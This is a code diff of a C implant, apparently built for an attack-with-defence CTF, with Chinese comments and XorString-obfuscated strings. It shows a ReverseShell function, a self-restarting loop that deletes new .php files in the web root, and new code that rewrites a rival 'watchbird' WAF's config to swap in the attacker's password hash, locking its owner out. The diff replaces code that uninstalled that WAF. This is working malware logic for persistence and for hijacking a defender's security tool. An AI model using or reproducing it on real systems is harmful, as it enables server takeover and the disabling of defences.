@@ -393,33 +393,9 @@ void ReverseShell(int cur_idx, char **argv)
  * 被 guard/main 共同守护（被杀自动重启），死循环执行：
  *   1. 递归扫描 WWWROOT，删除「修改时间 > xsh 启动时间」的 .php 文件
  *      （自己实现目录遍历，不依赖外部命令）
- *   2. 检查 /tmp 是否有 watchbird 目录（敌方 WAF），若有则：
- *      a. 找到 WWWROOT/watchbird.php，执行 php watchbird.php --uninstall
- *      b. 删除 /tmp/watchbird 目录
+ *   2. 检查 /tmp/watchbird 目录（敌方 WAF），若有则劫持其配置：
+ *      篡改 password_sha1 为我们的密码，敌方被锁死，我们可以登录控制面板
  */
-
-/* 递归删除目录（rm -rf 的 C 实现） */
-static void rmdir_recursive(const char *path)
-{
-    DIR *d = opendir(path);
-    if (!d) { remove(path); return; }
-
-    struct dirent *ent;
-    char child[1024];
-    while ((ent = readdir(d)) != NULL)
-    {
-        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
-            continue;
-        snprintf(child, sizeof(child), "%s/%s", path, ent->d_name);
-        struct stat st;
-        if (lstat(child, &st) == 0 && S_ISDIR(st.st_mode))
-            rmdir_recursive(child);
-        else
-            remove(child);
-    }
-    closedir(d);
-    rmdir(path);
-}
 
 /*
  * scan_and_clean_php：递归扫描目录，删除 mtime > boot_time 的 .php 文件。
@@ -465,145 +441,104 @@ static void scan_and_clean_php(const char *dir, time_t boot_time)
 }
 
 /*
- * find_watchbird_path：在 WWWROOT 中定位敌方 watchbird.php 的真实路径。
+ * hijack_enemy_watchbird：劫持敌方部署的 watchbird WAF。
  *
- * 策略：
- *   1. 先检查 WWWROOT/watchbird.php，存在则直接返回
- *   2. 若不存在，遍历 WWWROOT 下最多 5 个 .php 文件，读取头部
- *      查找 watchbird install 注入的特征：
- *        <?php include_once '/path/to/watchbird.php'; ?>   （头部注入）
- *        include_once '/path/to/watchbird.php';            （declare后注入）
- *      提取出被 include 的文件路径并返回
- *   3. 均未找到返回 0
+ * 不删除 watchbird，而是篡改其配置文件中的 password_sha1，
+ * 使敌方无法登录控制面板，而我们可以用自定义密码登录。
  *
- * 返回 1 表示找到（路径写入 out_path），0 表示未找到。
+ * watchbird 配置文件格式为 PHP serialize，password_sha1 字段格式：
+ *   s:14:"password_sha1";s:40:"原始SHA1值";
+ * 或初始状态：
+ *   s:14:"password_sha1";s:5:"unset";
+ *
+ * 我们读取整个配置文件，找到 password_sha1 后的字符串值并替换为
+ * WB_PASSWORD_SHA1 (40字节 SHA1)。
  */
-static int find_watchbird_path(char *out_path, int out_size)
+static void hijack_enemy_watchbird()
 {
-    /* 策略 1：直接检查默认路径 */
-    snprintf(out_path, out_size, "%swatchbird.php", XorString(WWWROOT));
+    /* 读取配置文件 */
     struct stat st;
-    if (stat(out_path, &st) == 0 && S_ISREG(st.st_mode))
-        return 1;
+    if (stat(XorString(WB_CONF_PATH), &st) != 0 || !S_ISREG(st.st_mode))
+        return;
+    if (st.st_size <= 0 || st.st_size > 65536)
+        return;
 
-    /* 策略 2：遍历 WWWROOT 下最多 5 个 php 文件，从 include_once 中提取路径 */
-    DIR *d = opendir(XorString(WWWROOT));
-    if (!d) return 0;
+    int fd = open(XorString(WB_CONF_PATH), O_RDONLY);
+    if (fd < 0) return;
+    char *buf = (char *)malloc(st.st_size + 1);
+    int n = read(fd, buf, st.st_size);
+    close(fd);
+    if (n <= 0) { free(buf); return; }
+    buf[n] = '\0';
 
-    struct dirent *ent;
-    int checked = 0;
-    char filepath[512];
-    char buf[4096];
+    /*
+     * 在 serialize 字符串中定位 password_sha1 的值。
+     * 格式: ...s:14:"password_sha1";s:NN:"值";...
+     * 查找 "password_sha1" 标记，然后定位后面的 s:NN:"..." 字符串值
+     */
+    const char *marker = "\"password_sha1\"";
+    char *pos = strstr(buf, marker);
+    if (!pos) { free(buf); return; }
+    pos += strlen(marker);
 
-    while ((ent = readdir(d)) != NULL && checked < 5)
+    /* 跳到下一个 s:NN:" 结构 */
+    char *s_pos = strstr(pos, "s:");
+    if (!s_pos) { free(buf); return; }
+
+    /* 找到值的左引号 */
+    char *quote_start = strchr(s_pos + 2, '"');
+    if (!quote_start) { free(buf); return; }
+    quote_start++; /* 跳过 " */
+
+    /* 找到值的右引号 */
+    char *quote_end = strchr(quote_start, '"');
+    if (!quote_end) { free(buf); return; }
+
+    /* 检查当前值是否已经是我们的密码 */
+    const char *our_sha1 = XorString(WB_PASSWORD_SHA1);
+    int old_len = quote_end - quote_start;
+    int new_len = strlen(our_sha1); /* 40 */
+
+    if (old_len == new_len && memcmp(quote_start, our_sha1, new_len) == 0)
     {
-        int namelen = strlen(ent->d_name);
-        if (namelen < 5) continue;
+        free(buf); /* 已经是我们的密码，无需修改 */
+        return;
+    }
 
-        /* 检查 .php / .php5 / .phtml 扩展名 */
-        const char *dot = strrchr(ent->d_name, '.');
-        if (!dot) continue;
-        if (strcmp(dot, ".php") != 0 && strcmp(dot, ".php5") != 0 &&
-            strcmp(dot, ".phtml") != 0)
-            continue;
+    /*
+     * 构造新的配置文件内容：
+     *   前缀 + 修正后的 s:40:"our_sha1" + 后缀
+     *
+     * 需要同时修正 s:NN 中的长度数字 NN
+     */
+    /* s_pos 指向 s:NN:"old_val"; 我们需要替换整个 s:NN:"..." 部分 */
+    char *val_end = quote_end + 1; /* 指向右引号后的 ; */
 
-        snprintf(filepath, sizeof(filepath), "%s%s", XorString(WWWROOT), ent->d_name);
-        if (stat(filepath, &st) != 0 || !S_ISREG(st.st_mode))
-            continue;
+    int prefix_len = s_pos - buf;
+    int suffix_len = n - (val_end - buf);
 
-        int fd = open(filepath, O_RDONLY);
-        if (fd < 0) continue;
-        int n = read(fd, buf, sizeof(buf) - 1);
+    /* 构造新的值片段: s:40:"sha1hex" */
+    char new_val[128];
+    snprintf(new_val, sizeof(new_val), "s:%d:\"%s\"", new_len, our_sha1);
+    int new_val_len = strlen(new_val);
+
+    int total = prefix_len + new_val_len + suffix_len;
+    char *newbuf = (char *)malloc(total + 1);
+    memcpy(newbuf, buf, prefix_len);
+    memcpy(newbuf + prefix_len, new_val, new_val_len);
+    memcpy(newbuf + prefix_len + new_val_len, val_end, suffix_len);
+    newbuf[total] = '\0';
+
+    /* 写回配置文件 */
+    fd = open(XorString(WB_CONF_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0)
+    {
+        write(fd, newbuf, total);
         close(fd);
-        if (n <= 0) continue;
-        buf[n] = '\0';
-        checked++;
-
-        /*
-         * watchbird install 有两种注入方式：
-         *   方式1: 文件开头 <?php include_once '/abs/path/watchbird.php'; ?>
-         *   方式2: declare 语句之后 \ninclude_once '/abs/path/watchbird.php';\n
-         *
-         * 统一搜索 include_once ' 或 require_once ' 后提取路径
-         */
-        const char *patterns[] = {
-            "include_once '", "require_once '",
-            "include_once \"", "require_once \"",
-            NULL
-        };
-        int i;
-        for (i = 0; patterns[i]; i++)
-        {
-            const char *pos = strstr(buf, patterns[i]);
-            if (!pos) continue;
-
-            /* 提取引号内的路径 */
-            char quote = patterns[i][strlen(patterns[i]) - 1]; /* ' 或 " */
-            const char *path_start = pos + strlen(patterns[i]);
-            const char *path_end = strchr(path_start, quote);
-            if (!path_end || path_end - path_start <= 0 ||
-                path_end - path_start >= out_size)
-                continue;
-
-            /* 检查路径中是否包含 watchbird 关键字 */
-            int plen = path_end - path_start;
-            char tmp[512];
-            memcpy(tmp, path_start, plen);
-            tmp[plen] = '\0';
-
-            if (strstr(tmp, "watchbird"))
-            {
-                strncpy(out_path, tmp, out_size - 1);
-                out_path[out_size - 1] = '\0';
-                closedir(d);
-                return 1;
-            }
-        }
-    }
-    closedir(d);
-    return 0;
-}
-
-/*
- * uninstall_enemy_watchbird：卸载敌方部署的 watchbird WAF。
- *
- *   1. 定位 watchbird.php（默认路径 or 从 PHP 文件头部 include 中提取）
- *   2. 调用 php watchbird.php --uninstall WWWROOT 清除所有 PHP 文件中的注入
- *   3. 删除 watchbird.php 本体
- *   4. 递归删除 /tmp/watchbird 配置目录
- */
-static void uninstall_enemy_watchbird()
-{
-    char wb_php[512];
-    if (!find_watchbird_path(wb_php, sizeof(wb_php)))
-        return; /* 未找到 watchbird */
-
-    struct stat st;
-
-    /* 先执行 --uninstall 清除所有 PHP 文件中的 include 注入 */
-    if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
-    {
-        pid_t p = fork();
-        if (p == 0)
-        {
-            execl(XorString("/usr/bin/php"), "php", wb_php,
-                  XorString("--uninstall"), XorString(WWWROOT), NULL);
-            execl(XorString("/usr/local/bin/php"), "php", wb_php,
-                  XorString("--uninstall"), XorString(WWWROOT), NULL);
-            _exit(127);
-        }
-        if (p > 0)
-        {
-            int status;
-            waitpid(p, &status, 0);
-        }
-
-        /* 删除 watchbird.php 本体 */
-        remove(wb_php);
     }
 
-    /* 删除 /tmp/watchbird 配置目录 */
-    rmdir_recursive(XorString("/tmp/watchbird"));
+    free(buf);
+    free(newbuf);
 }
 
 /*
@@ -618,11 +553,11 @@ void WebCleanRoutine()
         /* 1. 扫描删除新增的 .php 文件 */
         scan_and_clean_php(XorString(WWWROOT), boot_time);
 
-        /* 2. 检查并清理敌方 watchbird */
+        /* 2. 检查并劫持敌方 watchbird（篡改密码为我们的） */
         struct stat st;
         if (stat(XorString("/tmp/watchbird"), &st) == 0 && S_ISDIR(st.st_mode))
         {
-            uninstall_enemy_watchbird();
+            hijack_enemy_watchbird();
         }
 
         sleep(5); /* 每 5 秒巡检一次 */
